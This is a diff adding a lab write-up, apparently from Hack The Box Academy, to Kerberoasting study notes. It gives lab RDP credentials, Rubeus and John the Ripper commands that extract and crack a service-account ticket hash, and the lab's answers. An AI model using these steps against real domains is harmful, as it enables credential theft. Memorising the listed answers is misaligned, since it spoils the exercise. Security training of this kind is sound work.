@@ -2,6 +2,36 @@
 
 ---
 
+## Lab Attack Chain (ACADEMY-EA-MS01 / INLANEFREIGHT.LOCAL)
+
+**RDP in:** `xfreerdp /v:10.129.94.166 /u:htb-student /p:'Academy_student_AD!' /cert:ignore /dynamic-resolution`
+
+```powershell
+# 1. Navigate to tools
+cd C:\Tools
+
+# 2. Request ticket for svc_vmwaresso (vmware/inlanefreight.local SPN)
+.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
+# Output: $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@...
+```
+
+```bash
+# 3. On Linux — save hash with SINGLE QUOTES (double quotes break $ expansion)
+echo '$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$...' > vmware_tgs
+
+# 4. Crack with John (Hashcat OpenCL broken on this VM)
+john vmware_tgs --wordlist=/usr/share/wordlists/rockyou.txt
+# Result: Virtual01
+```
+
+**Lab answers:**
+- Q1 — SPN `vmware/inlanefreight.local` account: `svc_vmwaresso`
+- Q2 — Password: `Virtual01`
+
+**Shell quoting lesson learned:** Always use single quotes when echoing hashes to file. Double quotes cause zsh/bash to interpret `$` as variable expansion → empty or mangled file.
+
+---
+
 ## QUICK REFERENCE — Three Methods
 
 ### Method 1 — Rubeus (Fastest, Recommended)
